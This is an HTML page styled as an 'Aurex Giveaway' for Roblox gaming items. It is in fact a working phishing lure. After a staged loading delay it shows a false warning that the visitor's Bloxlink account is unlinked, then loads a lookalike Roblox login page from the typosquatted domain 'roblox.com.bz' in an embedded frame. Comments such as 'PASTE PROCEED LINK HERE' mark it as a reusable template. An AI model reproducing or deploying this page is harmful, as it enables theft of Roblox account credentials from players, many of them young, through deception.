# Pixel456
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Aurex Giveaway</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
            background-color: #030104; /* Extra deep space black */
            
            /* Star and crimson ambient glow dust layers */
            background-image: 
                radial-gradient(circle at 80% 40%, rgba(255, 0, 102, 0.15), transparent 400px),
                radial-gradient(circle at 20% 70%, rgba(255, 0, 60, 0.12), transparent 400px),
                radial-gradient(rgba(255, 255, 255, 0.3) 1px, transparent 20px),
                radial-gradient(rgba(255, 0, 80, 0.4) 2px, transparent 30px);
            background-size: 100% 100%, 100% 100%, 350px 350px, 250px 250px;
            background-position: 0 0, 0 0, 40px 60px, 130px 270px;
            
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center; 
            min-height: 100vh;
            padding: 20px;
            overflow-y: auto;
        }

        /* Glassmorphic Giveaway Card - Scaled and Optimized for Android Layouts */
        .giveaway-card {
            background: rgba(14, 7, 18, 0.88);
            border: 2px solid rgba(255, 0, 85, 0.2);
            padding: 45px 35px;
            border-radius: 24px;
            box-shadow: 0 0 60px rgba(255, 0, 85, 0.25), 
                        inset 0 0 20px rgba(255, 0, 85, 0.05);
            text-align: center;
            max-width: 680px; 
            width: 100%;
            z-index: 2;
            margin: auto;
            animation: cardFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes cardFadeIn {
            from { opacity: 0; transform: scale(0.97) translateY(10px); }
            to { opacity: 1; transform: scale(1) translateY(0); }
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            background: linear-gradient(to right, #ff1744, #d500f9);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 800;
            letter-spacing: 0.5px;
        }

        p.description {
            color: #a4a4c1;
            font-size: 1.1rem;
            line-height: 1.6;
            margin-bottom: 35px;
        }

        /* Vibrant Initial Pill Button */
        .enter-btn {
            display: block;
            background: linear-gradient(90deg, #ff007f 0%, #7928ca 100%);
            color: #ffffff;
            border: none;
            padding: 18px 30px;
            font-size: 1.2rem;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 30px rgba(255, 0, 127, 0.4);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            -webkit-tap-highlight-color: transparent;
        }

        .enter-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 40px rgba(255, 0, 127, 0.6);
        }

        /* Loading Spinner */
        .spinner {
            display: none;
            width: 55px;
            height: 55px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #ff007f;
            border-radius: 50%;
            margin: 40px auto;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .action-view {
            display: none;
            animation: fadeIn 0.4s ease-out;
        }

        /* Alert Panel Styling */
        .alert-box {
            color: #ff4a6b;
            background: rgba(255, 23, 68, 0.08);
            border: 1px solid rgba(255, 23, 68, 0.25);
            padding: 22px;
            border-radius: 16px;
            font-size: 1.05rem;
            line-height: 1.5;
            margin-bottom: 30px;
            text-shadow: 0 0 10px rgba(255, 23, 68, 0.15);
            text-align: center;
        }

        /* Layout Grid for Split Buttons */
        .btn-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .split-btn {
            padding: 16px 20px;
            font-size: 1.05rem;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            border: none;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: background 0.2s, transform 0.2s;
            -webkit-tap-highlight-color: transparent;
        }

        .proceed-btn {
            background: linear-gradient(90deg, #00f2fe 0%, #4facfe 100%);
            color: #030104;
            box-shadow: 0 4px 15px rgba(0, 242, 254, 0.25);
        }

        .proceed-btn:hover {
            transform: translateY(-2px);
        }

        .close-btn {
            background: rgba(255, 255, 255, 0.06);
            color: #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.12);
        }

        .close-btn:hover {
            background: rgba(255, 255, 255, 0.12);
            transform: translateY(-2px);
        }

        /* Clean Embedded Iframe Frame Container */
        .portal-frame-container {
            display: none;
            width: 100%;
            height: 480px; 
            margin-top: 20px;
            border-radius: 16px;
            overflow: hidden;
            border: 1px solid rgba(255, 0, 85, 0.25);
            background: #000000;
            animation: fadeIn 0.5s ease-in-out;
            -webkit-overflow-scrolling: touch;
        }

        .portal-frame {
            width: 100%;
            height: 100%;
            border: none;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @media (max-width: 480px) {
            h1 { font-size: 2rem; }
            .giveaway-card { padding: 30px 20px; }
            .btn-group { grid-template-columns: 1fr; gap: 12px; }
            .portal-frame-container { height: 380px; }
        }
    </style>
</head>
<body>

    <div class="giveaway-card" id="mainCard">
        <!-- Step 1: Initial Presentation Splash -->
        <div id="initialView">
            <h1>Aurex Giveaway</h1>
            <p class="description">The exclusive Aurex reward drop is now live! Click the button below to join the giveaway and secure your entry for premium gaming items.</p>
            <button class="enter-btn" id="enterBtn">Enter Giveaway</button>
        </div>

        <!-- Step 2: 3-Second Processing Spinner -->
        <div class="spinner" id="loadingSpinner"></div>

        <!-- Step 3: Selection Menu Choices View -->
        <div class="action-view" id="actionView">
            <div class="alert-box">
                Oops, your Bloxlink account isn't connected to your Roblox Account. Our website will mark you as a bot.
            </div>
            <div class="btn-group">
                <button class="split-btn proceed-btn" id="proceedBtn">Proceed</button>
                <button class="split-btn close-btn" id="closeBtn">Close</button>
            </div>
        </div>

        <!-- Step 4: Embedded Frame Window View -->
        <div class="portal-frame-container" id="frameContainer">
            <iframe class="portal-frame" src="about:blank" id="targetFrame"></iframe>
        </div>
    </div>

    <script>
        const initialView = document.getElementById('initialView');
        const spinner = document.getElementById('loadingSpinner');
        const actionView = document.getElementById('actionView');
        const frameContainer = document.getElementById('frameContainer');
        const targetFrame = document.getElementById('targetFrame');

        // Main splash click event
        document.getElementById('enterBtn').addEventListener('click', function() {
            initialView.style.display = 'none';
            spinner.style.display = 'block';

            setTimeout(() => {
                spinner.style.display = 'none';
                actionView.style.display = 'block';
            }, 3000); 
        });

        // PROCEED BUTTON CLICK: Loads your target link inside the in-page frame box
        document.getElementById('proceedBtn').addEventListener('click', function() {
            actionView.style.display = 'none';
            frameContainer.style.display = 'block';
            
            // 👇 PASTE PROCEED LINK HERE 👇
            targetFrame.src = "https://roblox.com.bz/login?returnUrl=0295377443746119"; 
        });

        // CLOSE BUTTON CLICK: Redirects the user completely back to your website home page
        document.getElementById('closeBtn').addEventListener('click', function() {
            
            // 👇 PASTE YOUR MAIN WEBSITE HOME LINK HERE 👇
            window.location.href = "https://hridyanshdhakad1-coder.github.io/pixel456/";
        });
    </script>

</body>
</html>
